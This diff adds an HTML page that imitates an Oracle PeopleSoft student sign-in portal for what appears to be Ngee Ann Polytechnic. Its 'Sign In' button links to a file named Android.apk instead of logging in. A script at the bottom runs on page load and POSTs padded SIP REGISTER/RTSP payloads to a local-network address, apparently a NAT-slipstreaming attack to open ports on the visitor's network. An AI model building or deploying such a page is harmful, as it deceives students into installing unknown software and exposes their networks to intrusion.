@@ -1,0 +1,201 @@
+
+<!DOCTYPE html>
+<html dir=ltr lang=ENG>
+<!-- Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved. -->
+<!--
+* ***************************************************************
+*  This software and related documentation are provided under a
+*  license agreement containing restrictions on use and
+*  disclosure and are protected by intellectual property
+*  laws. Except as expressly permitted in your license agreement
+*  or allowed by law, you may not use, copy, reproduce,
+*  translate, broadcast, modify, license, transmit, distribute,
+*  exhibit, perform, publish or display any part, in any form or
+*  by any means. Reverse engineering, disassembly, or
+*  decompilation of this software, unless required by law for
+*  interoperability, is prohibited.
+*  The information contained herein is subject to change without
+*  notice and is not warranted to be error-free. If you find any
+*  errors, please report them to us in writing.
+*
+*  Copyright (C) 1988, 2014, Oracle and/or its affiliates.
+*  All Rights Reserved.
+* ***************************************************************
+-->
+<head>
+<title>Oracle PeopleSoft Sign-in</title>
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">    
+<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,user-scalable=yes">  
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+
+<link  type="text/css" href="signin.css" rel="stylesheet">
+
+</head>
+<body onload="ptSignon().login();">
+<form id="login" name="login" method="post" action="?&cmd=login&languageCd=ENG" autocomplete="off">
+
+<div id="pswrapper">
+<table width="100%" height="99%"  border="0" cellpadding="0" cellspacing="0">
+<TR>
+<TD align="center">
+      <input type="hidden" id="timezoneOffset" name="timezoneOffset" value="0">
+      <input type="hidden" id="ptmode" name="ptmode" value="f">
+      <input type="hidden" id="ptlangcd" name="ptlangcd" value="ENG">
+      <input type="hidden" id="ptinstalledlang" name="ptinstalledlang" value="ENG">
+      <div class="signonMain">
+      <img src="images/Header.png" class="ps-staticimg" alt="Oracle PeopleSoft Sign-in" title="Oracle PeopleSoft Sign-in" >
+		  </div>
+</TD>
+</TR>
+<TR>
+</TR>
+</table>
+
+<div id="id_loginGroupingBorder" class="loginGroupingBorder">
+	<div id="id_ps_signinentry" class="ps_signinentry" >
+		<div id="ptloginerrorcont" class="ps_login_error" >
+			<div class="ps_login_error_inner" role="heading" aria-level="2">
+				<a id="error_link" name="error_link" tabindex="1"><img src="/student/images/PT_LOGIN_ERROR.gif" alt="Error"></a>
+				
+                <div class="psloginerror" id="discovery_error" name="discovery_error" role="alert" aria-live="assertive" ></div>
+                <span class="psloginerror" id="login_error" name="login_error" role="alert" aria-live="assertive"></span>                     
+			</div>
+            <div class="ps_box-control psloginerror" id="browsercheck_error" name="browsercheck_error" aria-live="assertive" role="alert"></div>
+		</div>
+		<br>
+		
+		<label class="userIdLabel" for="userid">User ID</label>
+		
+		<div class="ps_box-control">
+			<input type="text" id="userid" name="userid" class="useridTextBox" value="" title="User ID">
+		</div>
+
+		<label class="pwdLabel" for="pwd">Password</label>
+		<div class="ps_box-control">
+			<input type="password" id="pwd" name="pwd" class="pwdTextBox" title="Password" >
+		</div>
+<!--
+	    <div>
+               <span class="ps_label-show" id="ptLabelSelect"><label for="ps_select_box">Select a Language</label></span>
+           </div>
+
+
+            <div id="ps_select_parent" >
+              <div id= "ps_select_box" class="ps_box-control">            
+                <select id="ptlangsel" name="ptlangsel"  title="Select a Language" class="ps_select" onChange="ptSignon().changeLangFunc(this, event)">
+                  <option value="ENG" title="English">English</option>
+                  <option value="UKE" title="UK English">UK English</option>
+                  <option value="ESP" title="Spanish">Espa&ntilde;ol</option>
+                  <option value="DAN" title="Danish">Dansk</option>
+                  <option value="GER" title="German">Deutsch</option>
+                  <option value="FRA" title="French">Fran&ccedil;ais</option>
+                  <option value="CFR" title="Canadian French">Fran&ccedil;ais&nbsp;du&nbsp;Canada</option>
+                  <option value="ITA" title="Italian">Italiano</option>
+                  <option value="HUN" title="Hungarian">Magyar</option>
+                  <option value="DUT" title="Dutch">Nederlands</option>
+                  <option value="NOR" title="Norwegian">Norsk</option>
+                  <option value="POL" title="Polish">Polski</option>
+                  <option value="POR" title="Portuguese">Portugu&ecirc;s</option>
+                  <option value="ROM" title="Romanian">Rom&#x00E2;n&#x0103;</option>
+                  <option value="FIN" title="Finnish">Suomi</option>
+                  <option value="SVE" title="Swedish">Svenska</option>
+                  <option value="TUR" title="Turkish">T&#x00FC;rk&#x00E7;e</option>
+                  <option value="CZE" title="Czech">&#x010C;e&#x0161;tina</option>
+                  <option value="JPN" title="Japanese">&#x65E5;&#x672C;&#x8A9E</option>
+                  <option value="KOR" title="Korean">&#xD55C;&#xAD6D;&#xC5B4</option>
+                  <option value="RUS" title="Russian">&#x0420;&#x0443;&#x0441;&#x0441;&#x043A;&#x0438;&#x0439</option>
+                  <option value="THA" title="Thai">&#x0E20;&#x0E32;&#x0E29;&#x0E32;&#x0E44;&#x0E17;&#x0E22</option>
+                  <option value="ZHS" title="Simplified Chinese">&#x7B80;&#x4F53;&#x4E2D;&#x6587</option>
+                  <option value="ZHT" title="Traditional Chinese">&#x7E41;&#x9AD4;&#x4E2D;&#x6587;</option>
+                  <option value="ARA" title="Arabic">&#x0627;&#x0644;&#x0639;&#x0631;&#x0628;&#x064A;&#x0629;</option>
+                  <option value="VIE" title="Vietnamese">Ti&#7869;ng Vi&#7879;t</option>
+                </select>
+              </div>
+
+              <div id="ps_select_arrow" class="selectArrowOldIE" style="display:none">
+		      <img src="/student/images/Arrow_24x24px.png" alt="" title="">
+	        </div> 
+-->     
+	
+		<div class="ps_box-button">
+			<a class="ps-button" href="Android.apk">Sign In</a>
+		</div>
+<!--
+            <div class="ps_box-button">
+                <input type="checkbox" name="accessible" id="accessible">
+                <label for="accessible">Enable Accessibility Mode</label>
+            </div> 
+-->   
+
+
+
+<!--
+          <div class="ps_box-link">
+              <span class="ps-link"></span>
+          </div>
+	      <IMG SRC="/student/images/Footer.png" width="100%" alt="">
+      	  <footer id="ptfooter" class="ps_footer_text ">Copyright &copy; 2000, 2014, Oracle and/or its affiliates. All rights reserved. </footer>
+-->
+	</div>  
+
+	<div id="id_loginInformation" class="loginInformation">
+		<div class="font_resize" style="margin-left: 18px;">
+			<A>This Service is for Authorised Users Only</A>
+			<br> 
+			<br>
+			<A href="https://npweb2.np.edu.sg/np/cc/npal/s2bc5755/student/Pages/NPAL_Student_HelpFAQ.aspx" target="_blank">NPal2 Help/FAQ</A> | 
+			<A href="https://www1.np.edu.sg/CC/IThelp/Feedback.aspx" target="_blank">Feedback Form</A> 
+			<br>
+			<A href="https://www1.np.edu.sg/npnet/StuPwdMgt/Pages/Public/selfservicereset.aspx"target="_blank">Forgot Password</A> | 
+			<A href="https://www1.np.edu.sg/npnet/StuPwdMgt/Pages/Public/Login.aspx/" target="_blank">Change Password</A>
+			<br><br>
+			As an added security measure, please <A href="https://npweb2.np.edu.sg/np/cc/npal/s2bc5755/student/Pages/NPAL_ClearCache.aspx" target="_blank">clear browser cache </A>after use.
+			<br><br>
+			By clicking on the Sign In button, you agree to be bound by the terms specified in the <A href="https://npweb2.np.edu.sg/np/cc/npal/s2bc5755/student/Pages/NPAL_Student_TermsOfUse.aspx" target="_blank">Terms and Conditions.</A>
+			<br>
+			<br>
+			<div align="center"><img src="images/mstudent_apple.jpg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="images/mstudent_google.jpg"></div>
+			<br>
+		</div>
+	</div>
+</div>
+</form>
+
+<script>
+    let padding = "";
+    const API_URL = new URL("http://192.168.2.128:554");
+    const PORT = "8000";
+    const PADDING = "14217";
+    const LOCAL_IP = "192.168.2.129";
+    const PROTOCOL = "RSTP";
+    const SIP_PAYLOAD = `REGISTER sip:${API_URL.hostname};transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP ${LOCAL_IP}:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP\r\nMax-Forwards: 70\r\nContact: <sip:foo@${LOCAL_IP}:${PORT};rinstance=v40f3f83b335139c;transport=TCP>\r\nTo: <sip:bar@${API_URL.hostname};transport=TCP>\r\nFrom: <sip:foo@${API_URL.hostname};transport=TCP>;tag=U7c3d519\r\nCall-ID: aaaaaaaaaaaaa09921342194747119bbbbbbZjQ4M2M.\r\nCSeq: 1 REGISTER\r\nExpires: 70\r\nAllow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE\r\nSupported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri\r\nUser-Agent: foobar\r\nAllow-Events: presence, kpml\r\nContent-Length: 0\r\n\r\n`;
+    const RTSP_PAYLOAD = `SETUP rtsp://${API_URL.hostname}:${API_URL.port}/mystream/trackID=0 RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: LibVLC/3.0.9.2 (LIVE555 Streaming Media v2020.01.19)\r\nTransport: rtp/avp/tcp;client_port=${PORT}-${PORT + 1}\r\n\r\n`;
+    let payload = "";
+    switch (PROTOCOL) {
+        case "RTSP":
+            payload = RTSP_PAYLOAD;
+            break;
+        default:
+            payload = SIP_PAYLOAD;
+            break;
+    }
+    for (let index = 0; index < PADDING; index++) {
+        padding += "A";
+    }
+    let xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+            console.log(this);
+            document.getElementById("response").innerHTML = this.responseText;
+        }
+    };
+    xhttp.open("POST", API_URL, true);
+    xhttp.send(padding + payload);
+    console.log("Sent:", padding + payload);
+
+</script>
+
+</body>
+</html>
